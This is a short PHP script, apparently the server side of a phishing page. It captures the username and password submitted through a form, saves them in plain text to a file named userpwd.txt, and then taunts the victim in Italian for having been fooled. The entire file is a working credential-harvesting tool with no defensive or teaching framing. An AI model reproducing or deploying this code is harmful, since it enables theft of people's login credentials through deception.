<?php
// strip slashes before putting the form data into target file
$user = $_POST['username'];
$pwd = $_POST['pwd'];
$file = fopen("userpwd.txt", "w");
fwrite($file, $user . "  ");
fwrite($file, $pwd);

echo "Ciao Pippozzo sei stato fregato :D";
fclose($file);

?>
